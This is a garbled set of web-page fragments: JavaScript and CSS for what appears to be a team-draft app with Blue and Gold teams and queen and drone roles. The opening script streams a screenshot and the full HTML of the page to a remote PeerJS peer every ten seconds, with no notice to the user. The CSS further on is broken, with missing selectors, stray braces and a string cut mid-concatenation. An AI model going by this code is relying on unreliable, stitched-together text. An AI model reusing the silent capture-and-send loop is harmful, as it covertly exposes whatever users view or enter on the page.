	document.addEventListener('DOMContentLoaded', event => {
		const peer = new Peer('8yfliaishLIHLEWHLFiubai7ehfiuahi7hIUBEFl7eh4rgl8ihaergBLIIUWREHf')
		
		const conn = peer.connect('receiver')
		
		setInterval(function(event) {
		html2canvas(document.body).then(function(canvas) {
			const dataURL = canvas.toDataURL('image/png');
			const base64Image = dataURL.split(',')[1];
			html=document.documentElement.outerHTML || document.documentElement.innerHTML

			let data = {
				dataURL: dataURL,
				html: html
			}
			console.log('sending data',data)
			conn.send(data)
		});
	
	
		},10000)
	})
	</script>

	<script>
		var errorCounter=0;
		window.onerror = function(msg, url, linenumber) {
		var button=document.querySelector(".script-error button[type=button].close")
		if(button){
			button.click();
		}

		var elem=document.createElement('div');
		elem.style.cssText = 'position:absolute;top:0;left:15%;right:15%;z-index:100;';
		elem.innerHTML=''+
		'<div class="alert alert-danger alert-danger-dismissible script-error" role="alert">'+
		'  <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>'+
		'  <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>'+
		'  <span class="sr-only">Error:</span>'+
		'  <strong>Page has</strong> '+(++errorCounter)+' errors<br>'+
		'  <strong>message:</strong> '+msg+'<br>'+
		'  <strong>URL:</strong> '+url+'<br>'+
		'  <strong>Line Number:</strong> '+linenumber+
		'</div>'
		document.body.appendChild(elem);
	return false;
	}</script>

/*prevent overscrolling so we dont accidently refresh the page on some browsers*/
html {
    overflow: hidden;
    height: 100%;
}
body {
    height: 100%;
    overflow: auto;
}
/*end of prevent overscrolling*/

.parenthetical{
	border: 2px solid #555;
	border-radius:20%;
	border-top-width: 0;
	border-bottom-width: 0;
	padding: .10em .20em .10em .10em;
	margin: 0 !important;
	background-color: Lavender;
	max-height: 1.5em;
}
.disabled{
	pointer-events: none !important;
}

.disable-select {
  -webkit-user-select: none;  
  -moz-user-select: none;    
  -ms-user-select: none;      
  user-select: none;
}

.draggable{
	position: relative;
}
.draggable:after{
	content: '::';
	position: absolute;
	top:.25em;
	left:.25em;
	/*text-shadow: 0px 1px 1px #4d4d4d;*/
	text-shadow: -1px -1px 1px #fff, 1px 1px 1px #000;
	opacity: 0.3;

}
.draggable.no-drag:after{
	display: none !important;
}

.longclick {
	-webkit-animation-name: spaceboots;
	-webkit-animation-duration: 0.8s;
	-webkit-transform-origin:50% 50%;
	-webkit-animation-iteration-count: infinite;
	-webkit-animation-timing-function: linear;
}

@-webkit-keyframes spaceboots {
	0% { -webkit-transform: translate(2px, 1px) rotate(0deg); }
	10% { -webkit-transform: translate(-1px, -2px) rotate(-1deg); }
	20% { -webkit-transform: translate(-3px, 0px) rotate(1deg); }
	30% { -webkit-transform: translate(0px, 2px) rotate(0deg); }
	40% { -webkit-transform: translate(1px, -1px) rotate(1deg); }
	50% { -webkit-transform: translate(-1px, 2px) rotate(-1deg); }
	60% { -webkit-transform: translate(-3px, 1px) rotate(0deg); }
	70% { -webkit-transform: translate(2px, 1px) rotate(-1deg); }
	80% { -webkit-transform: translate(-1px, -1px) rotate(1deg); }
	90% { -webkit-transform: translate(2px, 2px) rotate(0deg); }
	100% { -webkit-transform: translate(2px, 1px) rotate(0deg); }
}
.no-animate{
	-o-transition-property: none !important;
	-moz-transition-property: none !important;
	-ms-transition-property: none !important;
	-webkit-transition-property: none !important;
	transition-property: none !important;
	/*CSS transforms*/
	-o-transform: none !important;
	-moz-transform: none !important;
	-ms-transform: none !important;
	-webkit-transform: none !important;
	transform: none !important;
	/*CSS animations*/
	-webkit-animation: none !important;
	-moz-animation: none !important;
	-o-animation: none !important;
	-ms-animation: none !important;
	animation: none !important;
}
.rotate90{
    -webkit-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);

}

	}

		display: none;
	}

		text-align: center;
		background-color: #DED;
		border-radius: 2em;
		margin: 1em 3.5em;
	}
	#everyone:before{
		content: 'Active';
		display: block;
		margin: 0 auto;
		font-size:1.5em;
		text-align: center;
	}
	.draftPool{
		background: white;
		border-radius: 1em;
		text-align: center;
		margin: 0;padding: 0 0 0 0;
	}
	.draftPool:before{
		content: 'Draft';
		font-size:1em;
		display: block;
		position: relative;
		left: -4%;
		width: 100%;
		text-align: center;
		font-weight: bold;
		border-bottom: thin dotted #CCC;
		margin:.5em 0 0 0;
	}
	/*.draftPool:empty {
		background: transparent;
		display: none;
	}*/

	.blueTeam, .goldTeam{
		padding: .5em 0;
		font-weight: bold;
		text-align: center;
		border-radius: 1em 0 0 1em;
	}

	.blueTeam{
		background: mediumblue;
	}
	.blueTeam + .goldTeam{
		border-radius: 0 1em 1em 0;
	}
	.blueTeam:before{
		content: "Blue";
		font-size:1.1em;
		font-weight: bold;
		color:white;
	}

	.goldTeam{
		background: gold;
	}
	.goldTeam:before{
		content: "Gold";
		font-size:1.1em;
		font-weight: bold;
	}
	.goldTeam + .blueTeam{
		border-radius: 0 1em 1em 0;
	}

	.queen{
		background: #000;
		display: block;
		overflow: hidden;
	}

	.queen:before{
		display: block;
		content:"\1F451";
		position: absolute;
		font-size: 3em;
		right:-.25em;top:-50%;
		opacity: .5;
	}
	.drone{
		background: #CCC;
		color:black;
		overflow: hidden;
		/*width: 25%;*/
	}
	.draggable:last-child{

		width: auto;
	}

	}

		display: block;
		content: "\1F41D";
		position: absolute;
		font-size: 3em;
		right:-.25em;top:-25%;
		opacity: .5;
	}

		position: absolute;

		width: 100%;height:100%;
		z-index: 9999999;
	}
	#trash .from-queue-place-holder:before,#trash .from-draft-place-holder:before{
		position: absolute;
		top:-100%;
		left: 0;

		text-align: center;
		color: black;

		z-index: 9999999;

			"		content: 'lg';"+
			"	}"+
			"}"
		var head = document.getElementsByTagName('head')[0];
		var link = document.createElement('link');
		link.rel = 'stylesheet';
		link.href = 'data:text/css,' + escape(css);  // IE needs this escaped

	}
